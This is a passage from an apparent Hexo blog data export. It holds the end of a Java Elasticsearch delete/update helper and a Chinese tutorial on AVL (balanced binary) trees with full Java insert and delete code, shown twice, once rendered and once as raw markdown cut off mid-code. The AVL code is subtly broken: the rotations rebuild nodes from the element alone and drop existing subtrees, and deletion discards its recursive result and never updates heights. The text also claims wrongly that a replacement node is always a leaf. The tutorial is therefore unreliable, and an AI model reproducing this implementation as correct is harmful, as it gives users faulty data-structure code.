class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 删</span><br><span class=\"line\">     * 删除指定id的数据</span><br><span class=\"line\">     * @param key</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public void  delete(String key)&#123;</span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span class=\"line\">        DeleteRequest deleteRequest = new DeleteRequest(Index, Type, key);</span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            DeleteResponse response = client.delete(deleteRequest,RequestOptions.DEFAULT);</span><br><span class=\"line\">            System.out.println(response.toString());</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 删除type下所有文档</span><br><span class=\"line\">     * 先查询 再删除</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public void deleteType()&#123;</span><br><span class=\"line\">        List&lt;String&gt; list = searchType();</span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span class=\"line\"></span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            for(String id: list)&#123;</span><br><span class=\"line\">                DeleteRequest deleteRequest = new DeleteRequest(Index,Type, id);</span><br><span class=\"line\">                client.delete(deleteRequest,RequestOptions.DEFAULT);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 更新指定id下的数据</span><br><span class=\"line\">     * key为id的值</span><br><span class=\"line\">     * @param key</span><br><span class=\"line\">     * @param map</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public void update(String key, Map&lt;String,Object&gt; map)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span class=\"line\"></span><br><span class=\"line\">        UpdateRequest updateRequest = new UpdateRequest(Index,Type,key);</span><br><span class=\"line\">        IndexRequest indexRequest = new IndexRequest().source(map);</span><br><span class=\"line\">        updateRequest.doc(indexRequest);</span><br><span class=\"line\"></span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            UpdateResponse response = client.update(updateRequest, RequestOptions.DEFAULT);</span><br><span class=\"line\">            System.out.println(response.toString());</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><br></details>\n\n<h3 id=\"二-Es一些基本知识\"><a href=\"#二-Es一些基本知识\" class=\"headerlink\" title=\"二.Es一些基本知识\"></a>二.Es一些基本知识</h3><h4 id=\"1-Es中文档数据例子\"><a href=\"#1-Es中文档数据例子\" class=\"headerlink\" title=\"1.Es中文档数据例子\"></a>1.Es中文档数据例子</h4><p>index+type+id可以确定一个唯一文档<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;_index&quot; :   &quot;megacorp&quot;,</span><br><span class=\"line\">  &quot;_type&quot; :    &quot;employee&quot;,</span><br><span class=\"line\">  &quot;_id&quot; :      &quot;1&quot;,</span><br><span class=\"line\">  &quot;_version&quot; : 1,</span><br><span class=\"line\">  &quot;found&quot; :    true,</span><br><span class=\"line\">  &quot;_source&quot; :  &#123;</span><br><span class=\"line\">      &quot;first_name&quot; :  &quot;John&quot;,</span><br><span class=\"line\">      &quot;last_name&quot; :   &quot;Smith&quot;,</span><br><span class=\"line\">      &quot;age&quot; :         25,</span><br><span class=\"line\">      &quot;about&quot; :       &quot;I love to go rock climbing&quot;,</span><br><span class=\"line\">      &quot;interests&quot;:  [ &quot;sports&quot;, &quot;music&quot; ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>_index – 索引名称<br><br>_type – 类型名称<br><br>_id – id(这个id可以自己指定也可以自动生成)<br><br>_version – 版本号,每次改动会+1<br><br>found – true表示在document存在<br><br>_source – document的全部内容<br></p>\n</blockquote>\n"},{"title":"平衡二叉树了解一下","date":"2019-08-20T21:02:30.000Z","_content":"\n\n# 一.什么是平衡二叉树\n\n平衡二叉树也是一种二叉查找树，有以下特点:\n\n- 1.可以是空树。\n- 2.假如不是空树，任何一个结点的左子树与右子树都是平衡二叉树，并且高度之差的绝对值不超过 1 (即高度要平衡)\n\n# 二.为什么要有平衡二叉树，即优缺点\n\n- 优\n\n在树这种数据结构中，树的高度影响着查找速度，层数越少，需要查询的次数越少，效率越高。\n而平衡二叉树，能减少树的高度，防止出现极端O(N)的情况，使效率稳定为O(logN).\n\n\n- 缺\n\n当数据量越来越大时，为了保证高度平衡，动态插入和删除的代价也随之增加。<br>\n\n在大数据量查找环境下(如数据库记录查找)，在二叉树结构下(2*N -1),N的层会太大，造成硬盘IO读写次数过多。(使用多路查找树).\n\n\n\n# 三.怎么实现\n\nAVL树，平衡二叉树的最早实现之一。以下为AVL树的实现.\n\n### 1.原理\n\n因为平衡二叉树比二叉查找树多了一些性质来保证高度平衡.所以在每一次插入数值之后，树的平衡性都可能被破坏，这时可以通过一个简单的操作来矫正平衡–--旋转。<br>\n\n旋转的目的就是减少高度，通过降低整棵树的高度来平衡。哪边的树高，就把那边的树向上旋转。\n\n四种旋转:<br>\n\n旋转是以失衡的节点为基准的<br>\nLL的解释, 第一个L代表根节点左边，第二个L代表插入的为左节点<br>\n\n- LL（左子树的左节点上插入节点而破坏平衡）：右旋转\n\n第一个 L: <strong>左子树</strong> <br>\n第二个 L: 失衡节点的左孩子的 <strong>左节点</strong>.\n\n![LL](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL.webp)\n\n- RR（右子树的右节点上插入节点而破坏平衡）：左旋转\n\n\n第一个 R: <strong>右子树</strong> <br>\n第二个 R: 失衡节点的右孩子的 <strong>右节点</strong>.\n![RR](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_RR.webp)\n\n- LR（左子树的右节点上插入节点而破坏平衡）：先左旋后右旋\n\n第一个 L: <strong>左子树</strong> <br>\n第二个 R: 失衡节点的左孩子的 <strong>右节点</strong>.\n![LR](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LR.webp)\n\n- RL（右子树的左节点上插入节点而破坏平衡）：先右旋后左旋\n\n第一个 R: <strong>右子树</strong> <br>\n第二个 L: 失衡节点的右孩子的 <strong>左节点</strong>.\n![RL](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_RL.webp)\n\n\n\n### 2.实现代码\n```\npublic class MyTest {\n\n    private static class Node<E>{\n        E elment;\n        Node<E> left;\n        Node<E> right;\n        int height;\n\n        Node(E elment){\n            this(elment, null, null);\n        }\n        Node(E elment, Node left, Node right){\n            this.elment = elment;\n            this.left = left;\n            this.right = right;\n        }\n\n    }\n\n    private static class AVLTree<E extends Comparable<? super E>>{\n        Node root;\n\n        public AVLTree(){\n            this.root = null;\n        }\n        public void insert(E elment){\n            this.root = insert(this.root, elment);\n        }\n        //递归找到要插入的位置插入，同时在return中平衡高度\n        public Node insert(Node<E> root, E elemet){\n            if( root == null ){\n                return new Node(elemet);\n            }\n\n            if(elemet.compareTo(root.elment) < 0 ){\n                //左边插入\n                root.left = insert(root.left, elemet);\n                //在return后平衡高度,因为是在左边插入，所以如果高度不平衡，只会是左边高于右边\n                if(height(root.left) - height(root.right) == 2){\n                    //判断是插在子节点的左边还是右边\n                    if(elemet.compareTo(root.left.elment) < 0){\n                        //LL\n                        root = nodeLL(root);\n                    }else {\n                        //LR\n                        root = nodeLR(root);\n                    }\n                }\n\n            }else if(elemet.compareTo(root.elment) > 0){\n                //右边插入\n                root.right = insert(root.right, elemet);\n                //在return后平衡高度,因为是在右边插入，所以如果高度不平衡，只会是右边高于左边\n                if(height(root.right) - height(root.left) == 2){\n                    //判断是插在子节点的左边还是右边\n                    if(elemet.compareTo(root.right.elment) < 0){\n                        //RL\n                        root = nodeRL(root);\n                    }else {\n                        //RR\n                        root = nodeRR(root);\n                    }\n                }\n            }\n\n            //更新节点高度\n            root.height = Math.max(height(root.left),height(root.right)) + 1;\n            return root;\n        }\n\n        //右旋\n        private Node nodeLL(Node node){\n            //旋转\n            Node newNode = node.left;\n            newNode.right = new Node(node.elment);\n            //调整高度值\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n        //左旋\n        private Node nodeRR(Node node){\n            Node newNode = node.right;\n            newNode.left = new Node(node.elment);\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n        //左旋再右旋\n        private Node nodeLR(Node node){\n            Node newNode = node.left.right;\n            newNode.left = new Node(node.left.elment);\n            newNode.right = new Node(node.elment);\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n        //右旋再左旋\n        private Node nodeRL(Node node){\n            Node newNode = node.right.left;\n            newNode.left = new Node(node.elment);\n            newNode.right = new Node(node.right.elment);\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n\n        private int height(Node node){\n            return node == null ? -1:node.height;\n        }\n\n    }\n\n\n    public static void main(String[] args){\n\n        AVLTree tree = new AVLTree();\n        tree.insert(5);\n        tree.insert(4);\n        tree.insert(6);\n        tree.insert(3);\n        tree.insert(2);\n\n        System.out.println(tree.root.elment);\n        System.out.println(tree.root.left.left.elment);\n        System.out.println(tree.root.left.right.elment);\n    }\n}\n\n```\n\n### 3.顺着代码来理一下逻辑\n\n1.定义节点类Node,其中height记录当前节点的高度，用来判断是否失衡\n\n2.定义AVL树，其实就一个root节点\n\n3.提供四种旋转方法，以失衡的节点为参\n\n4.通过insert() 不断插入来构建一棵AVL树\n\n主要注意insert(Node<E> root, E elemet)方法.\n通过递归，找到新节点的插入点，并插入，然后在一层层的返回结果中判断是否失衡，并调整。\n\n如图:<br>\n![insert](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_insert1.PNG)\n\n已有一棵平衡二叉树，再插入一个节点，节点值为2.<br>\n根据代码，相应流程如下:\n- 1.递归找到插入点\n- 2.在return中判断是否打破平衡，并进行调整.\n\n![insert2](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_insert2.PNG)\n```\n1.insert(Node(5), 2);\n2.    insert(Node(4), 2);\n3.        insert(Node(3), 2);\n4.            insert(null, 2);\n5.            return Node(2);\n6.        Node(3).left = Node(2); return Node(3);\n7.    Node(4).left = Node(3); height == 2;\n      旋转调整 Node(4) = LL(Node(4)); return Node(4);\n8.Node(5).left = Node(4); return Node(5);\n\nNode(5).right 即根节点的右子树，在本例中无变化\n```\n\n## 四.节点删除操作\n\n节点删除分为 删除节点 和 调整平衡两步.\n\n### 1.删除节点\n\n删除节点后 要保证剩下还是一棵二叉查找树(有序)。为了保证此条件，我们对删除的三种情况进行分析。<br>\n\n- 删除的节点为叶子节点\n\n此时可以直接删除。\n\n- 删除对的节点有一个子节点\n\n此时，无论是有左子节点还是右子节点，可以直接将要删除的节点直接用子节点进行替换。\n\n- 删除的节点有两个子节点\n\n此时判断下要删除的节点的左右子树高度， 若 height(left) >= height(right), 则取 左子树的最大值节点， 如 height(left) < height(right), 则取 右子树的最小值节点. 同时删除该取值的节点。<br>\n\n不管是最大值还是最小值节点，肯定都是叶子节点。<br>\n\n\n\n### 2.调整平衡\n\n#### (1)情况分析\n\n不同于插入, 如图:\n\n![LL2](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL_02.png)\n\n如上图中图一，新增的时候，只会有节点1 和 节点3 中的一个，不可能同时出现两个的情况，因为，当第一个出现时，节点4就已经失衡，进行调整了。<br>\n\n如上图中图二，当删除时，删除节点5， 会出现节点4失衡， 但是会出现 节点1和节点3 同时存在的情况。此时，将失衡类型 归入 LL 里面.<br>\n\n同理，会出现两个子树同时存在的 RR 情况.<br>\n\n在删除时，可能会出现失衡节点的子节点同时有左右子节点情况。所以，在调整平衡时，于插入有点不一样。如下图， 此时将 1，3 作为 LL, 将 2 作为 LR.<br>\n\n![LL4](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL_04.png)\n\n- LL：右旋转\n\n第一个 L: <strong>左子树</strong> <br>\n第二个 L: 失衡节点的左孩子的 <strong>左节点</strong>, <font color=#A52A2A>或 <strong>同时有左右节点</strong> </font>.\n\n\n- RR：左旋转\n\n第一个 R: <strong>右子树</strong> <br>\n第二个 R: 失衡节点的右孩子的 <strong>右节点</strong>,<font color=#A52A2A>或 <strong>同时有左右节点</strong> </font>.\n\n\n- LR：先左旋后右旋\n\n第一个 L: <strong>左子树</strong> <br>\n第二个 R: 失衡节点的左孩子的 <strong>右节点</strong>.\n\n\n- RL）：先右旋后左旋\n\n第一个 R: <strong>右子树</strong> <br>\n第二个 L: 失衡节点的右孩子的 <strong>左节点</strong>.\n\n\n\n\n#### (2)具体变化\n\n- LL\n\nLL 为右旋， 所以按照右旋的步骤：\n\n```\n//右旋\nprivate Node nodeLL(Node node){\n    //1.将失衡节点的左节点提升\n    Node newNode = node.left;\n    //2.将失衡节点下降\n    newNode.right = new Node(node.elment);\n    //调整高度值\n    newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n    return newNode;\n}\n```\n\n\n此时，失衡节点的左子节点的右子节点还未处理,将该右子节点作为失衡节点左节点改变代码为:\n```\n//右旋\nprivate Node nodeLL(Node node){\n    //1.将失衡节点的左节点提升\n    Node newNode = node.left;\n    //2.将失衡节点下降\n    newNode.right = new Node(node.elment);\n    //3.失衡节点的左子节点的右子节点处理\n    newNode.right.left = node.left.right;\n    //调整高度值\n    newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n    return newNode;\n}\n```\n\n如图:\n![LL3](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL_03.png)\n\n当失衡节点的左子节点的右子节点 不存在， 即为null,时，这样处理无影响。此时就和插入的平衡处理一个效果。\n\n- RR\n\n参照 LL, RR进行左旋操作\n\n```\n//左旋\nprivate Node nodeRR(Node node){\n    //1.将失衡节点的右子节点提升\n    Node newNode = node.right;\n    //2.将失衡节点下沉\n    newNode.left = new Node(node.elment);\n    //3.失衡节点的右节点的左孩子处理\n    newNode.left.right = node.right.left;\n    //调整高度\n    newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n    return newNode;\n}\n```\n\n\n此时，插入和删除的代码可以合并.\n\n#### (3)性能\n\n- 查找\n\nO(logn).\n\n- 插入\n\nO(logn) + 旋转。\n\n插入时，最多需要旋转1次(单旋转或双旋转).\n\n- 删除\n\nO(logn) + 旋转.\n\n删除之后必须检查从删除结点开始到根结点路径上的所有结点的平衡因子。每一次删除操作最多需要O(logN)次旋转。因此，删除操作的时间复杂度为O(logN)+O(logN)=O(2logN)\n\n\n### 3.完整代码\n\n```\npublic class MyTest {\n\n\n    private static class Node<E>{\n        E elment;\n        Node<E> left;\n        Node<E> right;\n        int height;\n\n        Node(E elment){\n            this(elment, null, null);\n        }\n        Node(E elment, Node left, Node right){\n            this.elment = elment;\n            this.left = left;\n            this.right = right;\n        }\n\n    }\n\n    private static class AVLTree<E extends Comparable<? super E>>{\n        Node root;\n\n        public AVLTree(){\n            this.root = null;\n        }\n        public void insert(E elment){\n            this.root = insert(this.root, elment);\n        }\n\n        public void delete(E elment){\n            if (elment != null){\n                this.root = delete(this.root, elment);\n            }\n        }\n\n        //递归找到要插入的位置插入，同时在return中平衡高度\n        public Node insert(Node<E> root, E elemet){\n            if( root == null ){\n                return new Node(elemet);\n            }\n\n            if(elemet.compareTo(root.elment) < 0 ){\n                //左边插入\n                root.left = insert(root.left, elemet);\n                //在return后平衡高度,因为是在左边插入，所以如果高度不平衡，只会是左边高于右边\n                if(height(root.left) - height(root.right) == 2){\n                    //判断是插在子节点的左边还是右边\n                    if(elemet.compareTo(root.left.elment) < 0){\n                        //LL\n                        root = nodeLL(root);\n                    }else {\n                        //LR\n                        root = nodeLR(root);\n                    }\n                }\n\n            }else if(elemet.compareTo(root.elment) > 0){\n                //右边插入\n                root.right = insert(root.right, elemet);\n                //在return后平衡高度,因为是在右边插入，所以如果高度不平衡，只会是右边高于左边\n                if(height(root.right) - height(root.left) == 2){\n                    //判断是插在子节点的左边还是右边\n                    if(elemet.compareTo(root.right.elment) < 0){\n                        //RL\n                        root = nodeRL(root);\n                    }else {\n                        //RR\n                        root = nodeRR(root);\n                    }\n                }\n            }\n\n            //更新节点高度\n            root.height = Math.max(height(root.left),height(root.right)) + 1;\n            return root;\n        }\n\n        //右旋\n        private Node nodeLL(Node node){\n            //1.将失衡节点的左节点提升\n            Node newNode = node.left;\n            //2.将失衡节点下降\n            newNode.right = new Node(node.elment);\n            //3.失衡节点的左子节点的右子节点处理\n            newNode.right.left = node.left.right;\n            //调整高度值\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n        //左旋\n        private Node nodeRR(Node node){\n            //1.将失衡节点的右子节点提升\n            Node newNode = node.right;\n            //2.将失衡节点下沉\n            newNode.left = new Node(node.elment);\n            //3.失衡节点的右节点的左孩子处理\n            newNode.left.right = node.right.left;\n            //调整高度\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n        //左旋再右旋\n        private Node nodeLR(Node node){\n            Node newNode = node.left.right;\n            newNode.left = new Node(node.left.elment);\n            newNode.right = new Node(node.elment);\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n        //右旋再左旋\n        private Node nodeRL(Node node){\n            Node newNode = node.right.left;\n            newNode.left = new Node(node.elment);\n            newNode.right = new Node(node.right.elment);\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n\n        private int height(Node node){\n            return node == null ? -1:node.height;\n        }\n\n\n        public Node delete(Node<E> root, E element){\n            if (root == null){\n                return null;\n            }\n\n            if(element.compareTo(root.elment) < 0){\n                //左递归\n                root.left = delete(root.left, element);\n                //重新调整平衡，删除左边，调整右边\n                if(height(root.left) - height(root.right) == 2 || height(root.left) - height(root.right) == -2){\n                    //判断是哪种调整方式\n                    // 只有失衡节点的右子树的左节点\n                    if(root.right.right == null){\n                        //RL\n                        root = nodeRL(root);\n                    }else {\n                        //RR\n                        root = nodeRR(root);\n                    }\n                }\n            }else if(element.compareTo(root.elment) > 0){\n                //右递归\n                root.right = delete(root.right, element);\n                //重新调整平衡，删除右边，调整左边\n                if(height(root.right) - height(root.left) == 2 || height(root.right) - height(root.left) == -2){\n                    //判断调整类型\n                    //只有失衡节点的左子树的右节点\n                    if(root.left.left == null){\n                        //LR\n                        root = nodeLR(root);\n                    }else {\n                        //LL\n                        root = nodeLL(root);\n                    }\n                }\n            }else {\n                //删除\n                if(root.left != null && root.right != null){\n                    //有两个子节点\n                    //找到替换得节点，右子树最小值\n                    root.elment = findElement(root);\n                    //删除替换节点，替换节点一定是叶子节点\n                    delete(root.right, root.elment);\n\n                }else if(root.left == null && root.right == null){\n                    //无子节点，自己是叶子节点\n                    root = null;\n                }else {\n                    //有一个子节点\n                    root = root.left != null ? root.left : root.right;\n                }\n            }\n            return root;\n        }\n\n        //判断替换点为左子树最大还是右子树最小\n        private E findElement(Node<E> root){\n            if(height(root.left) >= height(root.right)){\n                return findLeftMax(root.left);\n            }else {\n                return findRightMin(root.right);\n            }\n        }\n        private E findRightMin(Node<E> root){\n            while (root.left != null){\n                root = root.left;\n            }\n           return root.elment;\n        }\n        private E findLeftMax(Node<E> root){\n            while (root.right != null){\n                root = root.right;\n            }\n            return root.elment;\n        }\n    }\n\n\n    public static void main(String[] args){\n\n        AVLTree tree = new AVLTree();\n        tree.insert(4);\n        tree.insert(2);\n        tree.insert(5);\n        tree.insert(1);\n        tree.insert(3);\n\n\n        System.out.println(tree.root.elment);\n        tree.delete(5);\n        System.out.println(tree.root.elment);\n\n\n    }\n}\n\n```\n","source":"_posts/algorithm/平衡二叉树了解.md","raw":"---\ntitle: 平衡二叉树了解一下\ndate: 2019-08-20 17:02:30\ntags: [algorithm]\n---\n\n\n# 一.什么是平衡二叉树\n\n平衡二叉树也是一种二叉查找树，有以下特点:\n\n- 1.可以是空树。\n- 2.假如不是空树，任何一个结点的左子树与右子树都是平衡二叉树，并且高度之差的绝对值不超过 1 (即高度要平衡)\n\n# 二.为什么要有平衡二叉树，即优缺点\n\n- 优\n\n在树这种数据结构中，树的高度影响着查找速度，层数越少，需要查询的次数越少，效率越高。\n而平衡二叉树，能减少树的高度，防止出现极端O(N)的情况，使效率稳定为O(logN).\n\n\n- 缺\n\n当数据量越来越大时，为了保证高度平衡，动态插入和删除的代价也随之增加。<br>\n\n在大数据量查找环境下(如数据库记录查找)，在二叉树结构下(2*N -1),N的层会太大，造成硬盘IO读写次数过多。(使用多路查找树).\n\n\n\n# 三.怎么实现\n\nAVL树，平衡二叉树的最早实现之一。以下为AVL树的实现.\n\n### 1.原理\n\n因为平衡二叉树比二叉查找树多了一些性质来保证高度平衡.所以在每一次插入数值之后，树的平衡性都可能被破坏，这时可以通过一个简单的操作来矫正平衡–--旋转。<br>\n\n旋转的目的就是减少高度，通过降低整棵树的高度来平衡。哪边的树高，就把那边的树向上旋转。\n\n四种旋转:<br>\n\n旋转是以失衡的节点为基准的<br>\nLL的解释, 第一个L代表根节点左边，第二个L代表插入的为左节点<br>\n\n- LL（左子树的左节点上插入节点而破坏平衡）：右旋转\n\n第一个 L: <strong>左子树</strong> <br>\n第二个 L: 失衡节点的左孩子的 <strong>左节点</strong>.\n\n![LL](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL.webp)\n\n- RR（右子树的右节点上插入节点而破坏平衡）：左旋转\n\n\n第一个 R: <strong>右子树</strong> <br>\n第二个 R: 失衡节点的右孩子的 <strong>右节点</strong>.\n![RR](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_RR.webp)\n\n- LR（左子树的右节点上插入节点而破坏平衡）：先左旋后右旋\n\n第一个 L: <strong>左子树</strong> <br>\n第二个 R: 失衡节点的左孩子的 <strong>右节点</strong>.\n![LR](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LR.webp)\n\n- RL（右子树的左节点上插入节点而破坏平衡）：先右旋后左旋\n\n第一个 R: <strong>右子树</strong> <br>\n第二个 L: 失衡节点的右孩子的 <strong>左节点</strong>.\n![RL](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_RL.webp)\n\n\n\n### 2.实现代码\n```\npublic class MyTest {\n\n    private static class Node<E>{\n        E elment;\n        Node<E> left;\n        Node<E> right;\n        int height;\n\n        Node(E elment){\n            this(elment, null, null);\n        }\n        Node(E elment, Node left, Node right){\n            this.elment = elment;\n            this.left = left;\n            this.right = right;\n        }\n\n    }\n\n    private static class AVLTree<E extends Comparable<? super E>>{\n        Node root;\n\n        public AVLTree(){\n            this.root = null;\n        }\n        public void insert(E elment){\n            this.root = insert(this.root, elment);\n        }\n        //递归找到要插入的位置插入，同时在return中平衡高度\n        public Node insert(Node<E> root, E elemet){\n            if( root == null ){\n                return new Node(elemet);\n            }\n\n            if(elemet.compareTo(root.elment) < 0 ){\n                //左边插入\n                root.left = insert(root.left, elemet);\n                //在return后平衡高度,因为是在左边插入，所以如果高度不平衡，只会是左边高于右边\n                if(height(root.left) - height(root.right) == 2){\n                    //判断是插在子节点的左边还是右边\n                    if(elemet.compareTo(root.left.elment) < 0){\n                        //LL\n                        root = nodeLL(root);\n                    }else {\n                        //LR\n                        root = nodeLR(root);\n                    }\n                }\n\n            }else if(elemet.compareTo(root.elment) > 0){\n                //右边插入\n                root.right = insert(root.right, elemet);\n                //在return后平衡高度,因为是在右边插入，所以如果高度不平衡，只会是右边高于左边\n                if(height(root.right) - height(root.left) == 2){\n                    //判断是插在子节点的左边还是右边\n                    if(elemet.compareTo(root.right.elment) < 0){\n                        //RL\n                        root = nodeRL(root);\n                    }else {\n                        //RR\n                        root = nodeRR(root);\n                    }\n                }\n            }\n\n            //更新节点高度\n            root.height = Math.max(height(root.left),height(root.right)) + 1;\n            return root;\n        }\n\n        //右旋\n        private Node nodeLL(Node node){\n            //旋转\n            Node newNode = node.left;\n            newNode.right = new Node(node.elment);\n            //调整高度值\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n        //左旋\n        private Node nodeRR(Node node){\n            Node newNode = node.right;\n            newNode.left = new Node(node.elment);\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n        //左旋再右旋\n        private Node nodeLR(Node node){\n            Node newNode = node.left.right;\n            newNode.left = new Node(node.left.elment);\n            newNode.right = new Node(node.elment);\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n        //右旋再左旋\n        private Node nodeRL(Node node){\n            Node newNode = node.right.left;\n            newNode.left = new Node(node.elment);\n            newNode.right = new Node(node.right.elment);\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n\n        private int height(Node node){\n            return node == null ? -1:node.height;\n        }\n\n    }\n\n\n    public static void main(String[] args){\n\n        AVLTree tree = new AVLTree();\n        tree.insert(5);\n        tree.insert(4);\n        tree.insert(6);\n        tree.insert(3);\n        tree.insert(2);\n\n        System.out.println(tree.root.elment);\n        System.out.println(tree.root.left.left.elment);\n        System.out.println(tree.root.left.right.elment);\n    }\n}\n\n```\n\n### 3.顺着代码来理一下逻辑\n\n1.定义节点类Node,其中height记录当前节点的高度，用来判断是否失衡\n\n2.定义AVL树，其实就一个root节点\n\n3.提供四种旋转方法，以失衡的节点为参\n\n4.通过insert() 不断插入来构建一棵AVL树\n\n主要注意insert(Node<E> root, E elemet)方法.\n通过递归，找到新节点的插入点，并插入，然后在一层层的返回结果中判断是否失衡，并调整。\n\n如图:<br>\n![insert](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_insert1.PNG)\n\n已有一棵平衡二叉树，再插入一个节点，节点值为2.<br>\n根据代码，相应流程如下:\n- 1.递归找到插入点\n- 2.在return中判断是否打破平衡，并进行调整.\n\n![insert2](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_insert2.PNG)\n```\n1.insert(Node(5), 2);\n2.    insert(Node(4), 2);\n3.        insert(Node(3), 2);\n4.            insert(null, 2);\n5.            return Node(2);\n6.        Node(3).left = Node(2); return Node(3);\n7.    Node(4).left = Node(3); height == 2;\n      旋转调整 Node(4) = LL(Node(4)); return Node(4);\n8.Node(5).left = Node(4); return Node(5);\n\nNode(5).right 即根节点的右子树，在本例中无变化\n```\n\n## 四.节点删除操作\n\n节点删除分为 删除节点 和 调整平衡两步.\n\n### 1.删除节点\n\n删除节点后 要保证剩下还是一棵二叉查找树(有序)。为了保证此条件，我们对删除的三种情况进行分析。<br>\n\n- 删除的节点为叶子节点\n\n此时可以直接删除。\n\n- 删除对的节点有一个子节点\n\n此时，无论是有左子节点还是右子节点，可以直接将要删除的节点直接用子节点进行替换。\n\n- 删除的节点有两个子节点\n\n此时判断下要删除的节点的左右子树高度， 若 height(left) >= height(right), 则取 左子树的最大值节点， 如 height(left) < height(right), 则取 右子树的最小值节点. 同时删除该取值的节点。<br>\n\n不管是最大值还是最小值节点，肯定都是叶子节点。<br>\n\n\n\n### 2.调整平衡\n\n#### (1)情况分析\n\n不同于插入, 如图:\n\n![LL2](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL_02.png)\n\n如上图中图一，新增的时候，只会有节点1 和 节点3 中的一个，不可能同时出现两个的情况，因为，当第一个出现时，节点4就已经失衡，进行调整了。<br>\n\n如上图中图二，当删除时，删除节点5， 会出现节点4失衡， 但是会出现 节点1和节点3 同时存在的情况。此时，将失衡类型 归入 LL 里面.<br>\n\n同理，会出现两个子树同时存在的 RR 情况.<br>\n\n在删除时，可能会出现失衡节点的子节点同时有左右子节点情况。所以，在调整平衡时，于插入有点不一样。如下图， 此时将 1，3 作为 LL, 将 2 作为 LR.<br>\n\n![LL4](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL_04.png)\n\n- LL：右旋转\n\n第一个 L: <strong>左子树</strong> <br>\n第二个 L: 失衡节点的左孩子的 <strong>左节点</strong>, <font color=#A52A2A>或 <strong>同时有左右节点</strong> </font>.\n\n\n- RR：左旋转\n\n第一个 R: <strong>右子树</strong> <br>\n第二个 R: 失衡节点的右孩子的 <strong>右节点</strong>,<font color=#A52A2A>或 <strong>同时有左右节点</strong> </font>.\n\n\n- LR：先左旋后右旋\n\n第一个 L: <strong>左子树</strong> <br>\n第二个 R: 失衡节点的左孩子的 <strong>右节点</strong>.\n\n\n- RL）：先右旋后左旋\n\n第一个 R: <strong>右子树</strong> <br>\n第二个 L: 失衡节点的右孩子的 <strong>左节点</strong>.\n\n\n\n\n#### (2)具体变化\n\n- LL\n\nLL 为右旋， 所以按照右旋的步骤：\n\n```\n//右旋\nprivate Node nodeLL(Node node){\n    //1.将失衡节点的左节点提升\n    Node newNode = 